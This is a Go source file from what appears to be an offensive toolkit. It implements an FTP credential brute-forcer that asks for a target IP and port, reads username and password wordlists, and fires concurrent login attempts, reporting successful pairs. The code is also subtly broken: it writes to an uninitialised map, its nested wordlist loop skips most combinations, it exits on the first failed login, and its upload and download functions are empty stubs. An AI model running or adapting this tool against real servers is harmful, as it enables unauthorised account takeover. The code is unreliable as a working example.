package explore

import (
	"bufio"
	"fmt"
	"log"
	"os"

	"github.com/dutchcoders/goftp"
)

var info = make(chan map[string]string, 200)

func FTPcon(addr string) {
	newFTP, err1 := goftp.Connect(addr)
	if err1 != nil {
		log.Fatal(err1)
	}

	for uap := range info {
		err := newFTP.Login(uap["user"], uap["passwd"])
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("[*]%c[1;32;40m%s:%s\t%s%c[0m\n", 0x1B, "Successfully", uap["user"], uap["passwd"], 0x1B)
	}
}

func readFile(user, pass string) {
	var s map[string]string
	file, err := os.Open(user)
	if err != nil {
		log.Fatal(err)
	}
	file1, err1 := os.Open(pass)
	if err1 != nil {
		log.Fatal(err1)
	}
	fd1 := bufio.NewScanner(file)
	fd2 := bufio.NewScanner(file1)
	for fd1.Scan() {
		for fd2.Scan() {
			fmt.Println(fd1.Text() + fd2.Text())
			s["user"] = fd1.Text()
			s["passwd"] = fd2.Text()
			info <- s
		}
	}
	close(info)
}

func uploadFile() {}

func downloadFile() {}

func FtpExplore() {
	fmt.Printf("[*]%c[1;32;40m%s%c[0m\n", 0x1B, "FTP exploring,please waiting.....", 0x1B)
	reader1 := bufio.NewReader(os.Stdin)
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Println("输入IP:")
	IP, _, err1 := reader1.ReadLine()
	if err1 != nil {
		log.Fatal(err1)
	}
	fmt.Println("输入端口:")
	PORT, _, err2 := reader2.ReadLine()
	if err2 != nil {
		log.Fatal(err2)
	}

	fmt.Println(string(IP))
	fmt.Println(string(PORT))
	addr := string(IP) + ":" + string(PORT)
	readFile("txt\\SuperWordlist\\User_Pwds.txt", "txt\\SuperWordlist\\FastPwds.txt")
	for i := 0; i < cap(info); i++ {
		go FTPcon(addr)
	}
}
